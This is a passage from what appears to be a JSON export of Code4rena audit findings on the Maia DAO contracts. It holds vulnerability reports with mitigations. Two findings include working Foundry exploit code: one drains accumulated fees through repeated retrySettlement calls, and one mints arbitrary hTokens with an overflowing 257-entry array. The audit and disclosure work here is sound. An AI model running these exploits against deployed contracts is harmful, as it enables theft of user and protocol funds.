 external         virtual         nonReentrant         returns (uint256 shares, uint256 amount0, uint256 amount1)     {     ...         (_tokenId, _liquidity, amount0, amount1) = _nonfungiblePositionManager.mint(             INonfungiblePositionManager.MintParams({                 token0: address(_token0),                 token1: address(_token1),                 fee: poolFee,                 tickLower: tickLower,                 tickUpper: tickUpper,                 amount0Desired: amount0Desired,                 amount1Desired: amount1Desired,                 amount0Min: 0,                 amount1Min: 0,                 recipient: address(this),                 deadline: block.timestamp             })         );         ... ```  https://github.com/Maia-DAO/maia-ecosystem-monorepo/blob/2f6e87348877684aa0c12aec204fea210cfbe6eb/src/scope/talos/base/TalosBaseStrategy.sol#L99-L147  ```solidity     /// @notice Function modifier that checks if price has not moved a lot recently.     /// This mitigates price manipulation during rebalance and also prevents placing orders when it's too volatile.     modifier checkDeviation() {         ITalosOptimizer _optimizer = optimizer;         pool.checkDeviation(_optimizer.maxTwapDeviation(), _optimizer.twapDuration());         _;     } ```  https://github.com/Maia-DAO/maia-ecosystem-monorepo/blob/2f6e87348877684aa0c12aec204fea210cfbe6eb/src/scope/talos/base/TalosBaseStrategy.sol#L419-L425   ## Tools Used  VS Code, uniswapv3book  ## Recommended Mitigation Steps  Apply `checkDeviation` to `init()` function.   ## Assessed type  Other"}, {"title": "`ERC20Boost.sol` An user can be `attach`ed to a gauge and have no boost balance.", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/656", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-13"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Boost.sol#L150-L172 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Boost.sol#L80-L83 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Boost.sol#L336-L344   # Vulnerability details  When a user boosted gauge became deprecated, the user can transfer his boost tokens. When the same gauge is reintroduced to the active gauge list, the user will boost it again even if his boost token balance is zero.  ## Impact  Same amount of boost tokens can be allocated to gauges by multiple addresses.  ## Proof of Concept  Let's take an example:  1. Alice calls `attach()` from gaugeA to boost it;  -  `getUserBoost[alice]` is set to balanceOf(alice)  2. Owner removes gaugeA and it's added to `_deprecatedGauges`;  3. Alice calls `updateUserBoost()`; because gaugeA is now deprecated her allocated boost is set to `userBoost` which is initialized to zero (0) : ```solidity     function updateUserBoost(address user) external {         uint256 userBoost = 0;         address[] memory gaugeList = _userGauges[user].values();         uint256 length = gaugeList.length;         for (uint256 i = 0; i < length;) {             address gauge = gaugeList[i];             if (!_deprecatedGauges.contains(gauge)) {                 uint256 gaugeBoost = getUserGaugeBoost[user][gauge].userGaugeBoost;                 if (userBoost < gaugeBoost) userBoost = gaugeBoost;             }             unchecked {                 i++;             }         }         getUserBoost[user] = userBoost;         emit UpdateUserBoost(user, userBoost);     }  ``` 4.  `freeGaugeBoost()` returns the amount of unallocated boost tokens:  ```solidity  function freeGaugeBoost(address user) public view returns (uint256) {  return balanceOf[user] - getUserBoost[user]; }  ```  5. `transfer()` has `notAttached()` modifier that ensures the transferred amount is free (not allocated to any gauge); ```solidity     /**      * @notice Transfers `amount` of tokens from `msg.sender` to `to` address.      * @dev User must have enough free boost.      * @param to the address to transfer to.      * @param amount the amount to transfer.      */     function transfer(address to, uint256 amount) public override notAttached(msg.sender, amount) returns (bool) {         return super.transfer(to, amount);     } ``` 6. Alice transfer her tokens  7. When gaugeA is added back, `addGauge(gaugeA)` she will continue to boost gaugeA even if her balance is 0   https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Boost.sol#L150-L172  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Boost.sol#L81C1-L83C6  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Boost.sol#L336-L344  ## Tools Used  VS Code  ## Recommended Mitigation Steps One solution is `updateUserBoost()` to loop all gauges (active and deprecated) not only the active ones:  ```solidity     function updateUserBoost(address user) external {         uint256 userBoost = 0;         address[] memory gaugeList = _userGauges[user].values();           uint256 length = gaugeList.length;         for (uint256 i = 0; i < length;) {             address gauge = gaugeList[i];             uint256 gaugeBoost = getUserGaugeBoost[user][gauge].userGaugeBoost;             if (userBoost < gaugeBoost) userBoost = gaugeBoost;             unchecked {                 i++;             }         }         getUserBoost[user] = userBoost;         emit UpdateUserBoost(user, userBoost);     } ``` Even the `updateUserBoost()` comments indicates all `_userGauges` should be iterated over. ```solidity /** * @notice Update geUserBoost for a user, loop through all _userGauges * @param user the user to update the boost for. */ function  updateUserBoost(address user) external; ```   ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/653", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-08"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Qeew-Analysis.md)."}, {"title": "Attacker can steal Accumulated Awards from RootBridgeAgent by abusing retrySettlement()", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/645", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-11"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L238-L272 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1177-L1216 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/MulticallRootRouter.sol#L345-L409   # Vulnerability details  ## Impact  Accumulated Awards inside `RootBridgeAgent.sol` can be stolen. Accumulated Awards state will be compromised and awards will be stuck.   ### Note  End-to-end coded PoC is at the end of PoC section.   ## Proof of Concept  ### Gas state  The gas related state inside `RootBridgeAgent` consists of   `initialGas` - a checkpoint that records `gasleft()` at the start of `anyExecute` that has been called by Multichain when we have a cross-chain call.   `userFeeInfo` - this is a struct that contains `depositedGas` which is the total amount of gas that the user has paid for on a BranchChain. The struct also contains `gasToBridgeOut` which is the amount of gas to be used for further cross-chain executions. The assumption is that `gasToBridgeOut < depositedGas` which is checked at the start of `anyExecute(...)` .   At the end of `anyExecute(...)` - `_payExecutionGas()` is invoked that calculates the supplied gas available for execution on the Root `avaliableGas = _depositedGas - _gasToBridgeOut` and then a check is performed if `availableGas` is enough to cover `minExecCost` , (which uses the `initialGas` checkpoint and subtracts a second `gasleft()` checkpoint to represent the end of execution on the Root. The difference between `availableGas` and `minExecCost` is profit for the protocol and is recorded inside `accumulatedFees` state variable.    ```solidity function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain)         internal     {         //reset initial remote execution gas and remote execution fee information         delete(initialGas);         delete(userFeeInfo);          if (_fromChain == localChainId) return;          //Get Available Gas         uint256 availableGas = _depositedGas - _gasToBridgeOut;          //Get Root Environment Execution Cost         uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());          //Check if sufficient balance         if (minExecCost > availableGas) {             _forceRevert();             return;         }          //Replenish Gas         _replenishGas(minExecCost);          //Account for excess gas         accumulatedFees += availableGas - minExecCost;     } ```  ### Settlements  These are records of token\u2019s that are \u201cbridged out\u201d(transferred) through the `RootBridgeAgent` to a `BranchBridgeAgent` . By default when a settlement is created it is Successful, unless execution on the Branch Chain fails and `anyFallback(...)` is called on the `RootBridgeAgent` which will set the settlement status as Failed. An example way to create a settlement will be to bridge out some assets from BranchBridgeAgent to RootBridgeAgent and embed extra data that represents another bridge operation from RootBridgeAgent to BranchBridgeAgent ( this flow passes through the `MulticallRootRouter` & could be the same branch agent as the first one or different) - at this point a settlement will be created. Moreover, a settlement could fail, for example, because of insufficient `gasToBridgeOut` provided by the user. In that case `anyFallback` is triggered on the RootBridgeAgent failing the settlement. At this time `retrySettlement()` becomes available to call for the particular settlement.  ### The attack  Let\u2019s first examine closely the `retrySettlement()` function.   ```solidity function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {         //Update User Gas available.         if (initialGas == 0) {             userFeeInfo.depositedGas = uint128(msg.value);             userFeeInfo.gasToBridgeOut = _remoteExecutionGas;         }         //Clear Settlement with updated gas.         _retrySettlement(_settlementNonce);     } ```  If `initialGas == 0` it is assumed that someone directly calls `retrySettlement(...)` and therefore has to deposit gas (msg.value), however, if `initialGas > 0` it is assumed that `retrySettlement(...)` could be part of an `anyExecute(...)` call that contained instructions for the `MulticallRootRouter` to do the call through a `VirtualAccount` . Let\u2019s assume the second scenario where `initialGas > 0` and examine the internal `_retrySettlement`.   First we have the call to `_manageGasOut(...)` , where again if `initialGas > 0` we assume that the `retrySettlement(...)` is within an `anyExecute` , and therefore `userFeeInfo` state is already set. From there we perform a `_gasSwapOut(...)` with `userFeeInfo.gasToBridgeOut` where we swap `gasToBridgeOut` amount of `wrappedNative` for gas tokens that are burned. Then back in the internal `_retrySettlement(...)` the new gas is recorded in the settlement record and the message is sent to a Branch Chain via `anyCall`.  The weakness here is that after we retry a settlement with `userFeeInfo.gasToBridgeOut` we do not set `userFeeInfo.gasToBridgeOut = 0` , which if we perform only 1 `retrySettlement(...)` is not exploitable, however, if we embed in a single `anyExecute(...)` several `retrySettlement(...)`  calls it becomes obvious that we can pay 1 time for `gasToBridgeOut` on a Branch Chain and use it multiple times on the `RootChain` to fuel the many `retrySettlement(...)`.  The second feature that will be part of the attack is that on a Branch Chain we get refunded for the excess of `gasToBridgeOut` that wasn\u2019t used for execution on the Branch Chain.     ```solidity function _retrySettlement(uint32 _settlementNonce) internal returns (bool) {         //Get Settlement         Settlement memory settlement = getSettlement[_settlementNonce];          //Check if Settlement hasn't been redeemed.         if (settlement.owner == address(0)) return false;          //abi encodePacked         bytes memory newGas = abi.encodePacked(_manageGasOut(settlement.toChain));          //overwrite last 16bytes of callData         for (uint256 i = 0; i < newGas.length;) {             settlement.callData[settlement.callData.length - 16 + i] = newGas[i];             unchecked {                 ++i;             }         }          Settlement storage settlementReference = getSettlement[_settlementNonce];          //Update Gas To Bridge Out         settlementReference.gasToBridgeOut = userFeeInfo.gasToBridgeOut;          //Set Settlement Calldata to send to Branch Chain         settlementReference.callData = settlement.callData;          //Update Settlement Staus         settlementReference.status = SettlementStatus.Success;          //Retry call with additional gas         _performCall(settlement.callData, settlement.toChain);          //Retry Success         return true;     } ```  An attacker will trigger some number of `callOutAndBridge(...)` invocations from a Branch Chain with some assets and extra data that will call `callOutAndBridge(...)` on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain), however, the attacker will set minimum `depositedGas` to ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain, therefore, failing a number of settlements. The attacker will then follow with a `callOutAndBridge(...)` from a Branch Chain that contains extra data for the `MutlicallRouter` for the `VirtualAccount` to call `retrySettlement(...)` for every Failed settlement. Since we will have multiple `retrySettlement(...)` invocations inside a single `anyExecute` at some point the `gasToBridgeOut` sent to each settlement will become `>` the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem his profit on the Branch Chain, since he gets a gas refund there, and there will also be a mismatch between `accumulatedRewards` and the native currency in `RootBridgeAgent` , therefore, `sweep()` will revert and any `accumulatedRewards` that are left will be bricked.   ### Coded PoC  Copy the two functions `testGasIssue` & `_prepareDeposit` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.   Execute with `forge test --match-test testGasIssue -vv`   Result - attacker starts with 1000000000000000000 wei (1 ether) and has 1169999892307980000 wei (>1 ether) after execution of attack (the end number could be slightly different, depending on foundry version). Mismatch between `accumulatedRewards` and the amount of WETH in the contract.   Note - there are console logs added from the developers in some of the mock contracts, consider commenting them out for clarity of the output.  ```solidity function testGasIssue() public {         testAddLocalTokenArbitrum();         console2.log(\"---------------------------------------------------------\");         console2.log(\"-------------------- GAS ISSUE START---------------------\");         console2.log(\"---------------------------------------------------------\");         // Accumulate rewards in RootBridgeAgent         address some_user = address(0xAAEE);         hevm.deal(some_user, 1.5 ether);         // Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some fees         bytes memory empty_params = abi.encode(bytes1(0x00));         hevm.prank(some_user);         avaxMulticallBridgeAgent.callOut{value: 1.1 ether }(empty_params, 0);          // Get the global(root) address for the avax H mock token         address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);          // Attacker starts with 1 ether         address attacker = address(0xEEAA);         hevm.deal(attacker, 1 ether);                  // Mint 1 ether of the avax mock underlying token         hevm.prank(address(avaxPort));                  MockERC20(address(avaxMockAssetToken)).mint(attacker, 1 ether);                  // Attacker aproves the underlying token         hevm.prank(attacker);         MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort), 1 ether);                   // Print out the amounts of WrappedNative & AccumulateAwards state          console2.log(\"RootBridge WrappedNative START\",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));         console2.log(\"RootBridge ACCUMULATED FEES START\", multicallBridgeAgent.accumulatedFees());          // Attacker's underlying avax mock token balance         console2.log(\"Attacker underlying token balance avax\", avaxMockAssetToken.balanceOf(attacker));          // Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail         // We will have to mock this fail since we don't have the MultiChain contracts, but the provided          // Mock Anycall has anticipated for that          DepositInput memory deposit = _prepareDeposit();         uint128 remoteExecutionGas = 2_000_000_000;          Multicall2.Call[] memory calls = new Multicall2.Call[](0);          OutputParams memory outputParams = OutputParams(attacker, globalAddress, 500, 500);                  bytes memory params = abi.encodePacked(bytes1(0x02),abi.encode(calls, outputParams, avaxChainId));          console2.log(\"ATTACKER ETHER BALANCE START\", attacker.balance);          // Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall         // Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)         MockAnycall(localAnyCallAddress).toggleFallback(1);          // execute         hevm.prank(attacker);         // in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)         avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether }(params, deposit, remoteExecutionGas);          // Switch to normal mode          MockAnycall(localAnyCallAddress).toggleFallback(0);         // this will call anyFallback() on the Root and Fail the settlement         MockAnycall(localAnyCallAddress).testFallback();          // Repeat for 1 more settlement         MockAnycall(localAnyCallAddress).toggleFallback(1);         hevm.prank(attacker);         avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether}(params, deposit, remoteExecutionGas);                  MockAnycall(localAnyCallAddress).toggleFallback(0);         MockAnycall(localAnyCallAddress).testFallback();                  // Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attack          console2.log(\"RootBridge WrappedNative AFTER SETTLEMENTS FAILUER BUT BEFORE ATTACK\",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));         console2.log(\"RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILUER BUT BEFORE ATTACK\", multicallBridgeAgent.accumulatedFees());          // Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since          // initialGas > 0 because we execute the calls as a part of an anyExecute()         Multicall2.Call[] memory malicious_calls = new Multicall2.Call[](2);          bytes4 selector = bytes4(keccak256(\"retrySettlement(uint32,uint128)\"));          malicious_calls[0] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,1,0)});         malicious_calls[1] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,2,0)});         // malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});                  outputParams = OutputParams(attacker, globalAddress, 500, 500);                  params = abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls, outputParams, avaxChainId));          // At this point root now has ~1.1          hevm.prank(attacker);         avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.1 ether}(params, deposit, 0.09 ether);                  // get attacker's virtual account address         address vaccount = address(rootPort.getUserAccount(attacker));          console2.log(\"ATTACKER underlying balance avax\", avaxMockAssetToken.balanceOf(attacker));         console2.log(\"ATTACKER global avax h token balance root\", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));          console2.log(\"ATTACKER ETHER BALANCE END\", attacker.balance);         console2.log(\"RootBridge WrappedNative END\",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));         console2.log(\"RootBridge ACCUMULATED FEES END\", multicallBridgeAgent.accumulatedFees());         console2.log(\"---------------------------------------------------------\");         console2.log(\"-------------------- GAS ISSUE END ----------------------\");         console2.log(\"---------------------------------------------------------\");      }      function _prepareDeposit() internal returns(DepositInput memory) {         // hToken address         address addr1 = avaxMockAssethToken;          // underlying address         address addr2 = address(avaxMockAssetToken);          uint256 amount1 = 500;         uint256 amount2 = 500;          uint24 toChain = rootChainId;          return DepositInput({             hToken:addr1,             token:addr2,             amount:amount1,             deposit:amount2,             toChain:toChain         });      } ```  ## Tools used  Manual inspection  ## Reccomendation  It is hard to conclude a particular fix but consider setting `userFeeInfo.gasToBridgeOut = 0` after `retrySettlement`  as part of the mitigation.   ## Assessed type  Context"}, {"title": "Attacker can mint arbitrary amount of hToken on RootChain", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/643", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-12"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L275-L316 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgentExecutor.sol#L259-L299 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L404-L426 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootPort.sol#L276-L284   # Vulnerability details  ## Impact  Adversary can construct an attack vector that let\u2019s him mint arbitrary amount of hToken\u2019s on the Root Chain.  ## Note  End-to-end coded PoC is at the end of PoC section.   ## Proof of Concept  ### Background  The attack will start on a Branch Chain where we have some underlying ERC20 `token` and a corresponding `hToken`  that represents `token` within the omnichain system. The `callOutSignedAndBridgeMultiple(...)` function is supposed to bridge multiple tokens to a destination chain and also carry the msg.sender so that the tokens can be credited to msg.sender's VirtualAccount. The attacker will call the function with such `DepositMultipleInputParams` `_dParams` that take advantage of several weaknesses contained within the function (below is an overview of DepositMultipleInput struct & flow diagram of BranchBridgeAgent).  ```solidity struct DepositMultipleInput {     //Deposit Info     address[] hTokens; //Input Local hTokens Address.     address[] tokens; //Input Native / underlying Token Address.     uint256[] amounts; //Amount of Local hTokens deposited for interaction.     uint256[] deposits; //Amount of native tokens deposited for interaction.     uint24 toChain; //Destination chain for interaction. } ```  ```mermaid  flowchart TB A[\"callOutSignedAndBridgeMultiple(,DepositMultipleInput memory _dParams,)\"]  -->|1 |B[\"_depositAndCallMultiple(...)\"]     B --> |2| C[\"_createDepositMultiple(...)\"]     B --> |4| D[\"__performCall(_data)\"]     C --> |3| E[\"IPort(address).bridgeOutMultiple(...)\"]  ```  Weakness `#1`  is that the supplied array of tokens `address[] hTokens` in `_dParams` is not checked if it exceeds 256, this causes an obvious issue where if `hTokens` length is > 256 the recorded length in `packedData` will be wrong since it's using an unsafe cast to uint8 and will overflow - `uint8(_dParams.hTokens.length)` .   ```solidity function callOutSignedAndBridgeMultiple(         bytes calldata _params,         DepositMultipleInput memory _dParams,         uint128 _remoteExecutionGas     ) external payable lock requiresFallbackGas {         // code ...          //Encode Data for cross-chain call.         bytes memory packedData = abi.encodePacked(             bytes1(0x06),             msg.sender,             uint8(_dParams.hTokens.length),             depositNonce,             _dParams.hTokens,             _dParams.tokens,             _dParams.amounts,             _deposits,             _dParams.toChain,             _params,             msg.value.toUint128(),             _remoteExecutionGas         );          // code ...     _depositAndCallMultiple(...);     } ```  Weakness `#2` arises in the subsequent internal function `_depositAndCallMultiple(...)`, where the only check done on the supplied `hTokens`, `tokens`, `amounts` & `deposits` arrays is if the lengths match, however, there is no check if the length is the same as the one passed earlier to packedData.    ```solidity function _depositAndCallMultiple(         address _depositor,         bytes memory _data,         address[] memory _hTokens,         address[] memory _tokens,         uint256[] memory _amounts,         uint256[] memory _deposits,         uint128 _gasToBridgeOut     ) internal {         //Validate Input         if (             _hTokens.length != _tokens.length || _tokens.length != _amounts.length                 || _amounts.length != _deposits.length         ) revert InvalidInput();          //Deposit and Store Info         _createDepositMultiple(_depositor, _hTokens, _tokens, _amounts, _deposits, _gasToBridgeOut);          //Perform Call         _performCall(_data);     } ```  Lastly, weakness `#3` is that  `bridgeOutMultiple(...)`, called within `_createDepositMultiple(...)`, allows for supplying any address in the `hTokens` array since it only performs operations on these addresses if -  `_deposits[i] > 0` or `_amounts[i] - _deposits[i] > 0` - in other words - if we set `deposits[i] = 0` & `amounts[i] = 0` we can supply ANY address in `hTokens[i]`.  ```solidity function bridgeOutMultiple(         address _depositor,         address[] memory _localAddresses,         address[] memory _underlyingAddresses,         uint256[] memory _amounts,         uint256[] memory _deposits     ) external virtual requiresBridgeAgent {         for (uint256 i = 0; i < _localAddresses.length;) {             if (_deposits[i] > 0) {                 _underlyingAddresses[i].safeTransferFrom(                     _depositor,                     address(this),                     _denormalizeDecimals(_deposits[i], ERC20(_underlyingAddresses[i]).decimals())                 );             }             if (_amounts[i] - _deposits[i] > 0) {                 _localAddresses[i].safeTransferFrom(_depositor, address(this), _amounts[i] - _deposits[i]);                 ERC20hTokenBranch(_localAddresses[i]).burn(_amounts[i] - _deposits[i]);             }             unchecked {                 i++;             }         }     } ```  ### Supplying the attack vector  The attacker will construct such `DepositMultipleInput _dParams` where `address[] hTokens` will have a length of 257 where all entries, except `hTokens[1], hTokens[2] & hTokens[3]` , will contain the Branch address of the same `hToken` (note that in the examined functions above there is no restriction to supply the same `hToken` address multiple times).   In a similar way `address[] tokens` will have length of 257, however, here all entries will contain the underlying `token` (it is crucial to include the address of the underlying `token` to bypass `_normalizeDecimals`).    Next `uint256[] amounts` will be of length 257 where all entries will contain 0. Similarly   `uint256[] deposits` will be of length 257 where all entries will contain 0. In such configuration the attacker is able to supply a malicious `hToken` address as per weakness `#3`.  The crucial part now is that `hTokens[1]` will contain the address of the underlying `token` - this is needed to later bypass the params check on the RootChain.  `hTokens[2] & hTokens[3]` will contain the attacker\u2019s malicious payload address that when converted to bytes and then `uint256` will represent the arbitrary amount of tokens that the attacker will mint (this conversion will happen on the RootChain).  This is how the attack vector looks expressed in code.  ```solidity     // hToken address, note the \"h\" in the var name         address addr1 = avaxMockAssethToken;          // underlying address         address addr2 = address(avaxMockAssetToken);          // 0x2FAF0800 when packed to bytes and then cast to uint256 = 800000000     // this amount will be minted on Root          address malicious_address = address(0x2FAF0800);                  uint256 amount1 = 0;         uint256 amount2 = 0;          uint num = 257;         address[] memory htokens = new address[](num);         address[] memory tokens = new address[](num);         uint256[] memory amounts = new uint256[](num);         uint256[] memory deposits = new uint256[](num);          for(uint i=0; i<num; i++) {             htokens[i] = addr1;             tokens[i] = addr2;             amounts[i] = amount1;             deposits[i] = amount2;         }              // address of the underlying token         htokens[1] = addr2;                // copy of entry containing the arbitrary number of tokens         htokens[2] = malicious_address;                  // entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Root         htokens[3] = malicious_address;                 uint24 toChain = rootChainId;          // create input         DepositMultipleInput memory input = DepositMultipleInput({             hTokens:htokens,             tokens:tokens,             amounts:amounts,             deposits:deposits,             toChain:toChain         }); ```  Essentially what happens now is that the attacker has `packedData` that contains 257 `hTokens`, `tokens`, `amounts` & `deposits` , however due to weakness `#1` the recorded length is 1 and due to weakness `#2` and `#3` this construction of the Input will reach `_peformCal(data)` and the mismatch between the number of entries and the actual number of supplied entries will cause malicious behavior on the RootChain.   ```solidity bytes memory packedData = abi.encodePacked(             bytes1(0x06),             msg.sender,             uint8(_dParams.hTokens.length),             depositNonce,             _dParams.hTokens,             _dParams.tokens,             _dParams.amounts,             _deposits,             _dParams.toChain,             _params,             msg.value.toUint128(),             _remoteExecutionGas         ); ```  The attack vector is inline with the general encoding scheme displayed below, the important note is that Length will contain a value of 1 instead of 257 which will disrupt the decoding on the RootBranch. More details about the encoding can be found in `IRootBridgeAgent.sol` .  ``` +--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+ |  Flag  |  Signer  | Length | depositNonce | hTokens[0], [1] ... [256] | tokens[0] ... [256] | amounts[0] ... [256] | deposits[0] ... [256] | toChain | data |   gas    | +--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+ | 1 byte | 20 bytes | 1 byte |   4 bytes    |       32 bytes * 257      |    32 bytes * 257   |    32 bytes * 257    |     32 bytes * 257    | 3 bytes | any  | 32 bytes | +--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+ ```  ### RootBranch receives the attack vector  The entry point for a message on the Root Chain is `anyExecute(bytes calldata data)`  in `RootBridgeAgent.sol` - this will be called by Multichain\u2019s AnycallExecutor. The function will unpack and navigate the supplied flag 0x06 - corresponding to `callOutSignedAndBridgeMultiple(...)` that was invoked on the Branch Chain.   Next `executeSignedWithDepositMultiple(...)`will be invoked residing in `RootBridgeAgentExecutor.sol`, which will subsequently call `_bridgeInMultiple(...)`, however, the amount of data passed to `_bridgeInMultiple(...)` depends on the packed length of the `hTokens` array.  ``` function executeSignedWithDepositMultiple(         address _account,         address _router,         bytes calldata _data,         uint24 _fromChainId     ) external onlyOwner returns (bool success, bytes memory result) {         //Bridge In Assets         DepositMultipleParams memory dParams = _bridgeInMultiple(             _account,             _data[                 PARAMS_START_SIGNED:                     PARAMS_END_SIGNED_OFFSET                         + uint16(uint8(bytes1(_data[PARAMS_START_SIGNED]))) * PARAMS_TKN_SET_SIZE_MULTIPLE             ],             _fromChainId         );      // more code ... ```  If we examine closer the constants and check with the encoding scheme -   PARAMS_START_SIGNED = 21  PARAMS_END_SIGNED_OFFSET = 29  PARAMS_TKN_SET_SIZE_MULTIPLE = 128,   Here the intended behavior is that `_data`  is sliced in such a way that it removes the flag `bytes1(0x06)` and the msg.sender address, hence we start at byte 21, we have 29 to account for the bytes4(nonce), bytes3(chainId) and bytes1(length) (total of 8 bytes, but remember that byte slicing is exclusive of the second byte index) + uint16(length) * 128 for every set of `htoken` `token` `amount` & `deposit` . What will happen in the attack case is that `_data` will be cut short since length will be 1 instead of 257 and `_data` will contain length, nonce, chainId and the first 4 entries of the constructed `hTokens[]` array.   Now `_bridgeInMultiple` will unpack the `_dParams` where `numOfAssets = 1`, hence only 1 iteration, and will populate a set with in reality the first 4 entries of the supplied `hTokens[]` in the attack vector -   `hTokens[0] = hToken address`,   `tokens[0] = token address`,   `amounts[0] = malicious address payload cast to uint256`,   `deposits[0] = malicious address payload cast to uint256`.  ```solidity function _bridgeInMultiple(address _recipient, bytes calldata _dParams, uint24 _fromChain)         internal         returns (DepositMultipleParams memory dParams)     {         // Parse Parameters         uint8 numOfAssets = uint8(bytes1(_dParams[0]));         uint32 nonce = uint32(bytes4(_dParams[PARAMS_START:5]));         uint24 toChain = uint24(bytes3(_dParams[_dParams.length - 3:_dParams.length]));          address[] memory hTokens = new address[](numOfAssets);         address[] memory tokens = new address[](numOfAssets);         uint256[] memory amounts = new uint256[](numOfAssets);         uint256[] memory deposits = new uint256[](numOfAssets);          for (uint256 i = 0; i < uint256(uint8(numOfAssets));) {             //Parse Params             hTokens[i] = address(                 uint160(                     bytes20(                         bytes32(                             _dParams[                                 PARAMS_TKN_START + (PARAMS_ENTRY_SIZE * i) + 12:                                     PARAMS_TKN_START + (PARAMS_ENTRY_SIZE * (PARAMS_START + i))                             ]                         )                     )                 )             );              tokens[i] = address(                 uint160(                     bytes20(                         _dParams[                             PARAMS_TKN_START + PARAMS_ENTRY_SIZE * uint16(i + numOfAssets) + 12:                                 PARAMS_TKN_START + PARAMS_ENTRY_SIZE * uint16(PARAMS_START + i + numOfAssets)                         ]                     )                 )             );              amounts[i] = uint256(                 bytes32(                     _dParams[                         PARAMS_TKN_START + PARAMS_AMT_OFFSET * uint16(numOfAssets) + (PARAMS_ENTRY_SIZE * uint16(i)):          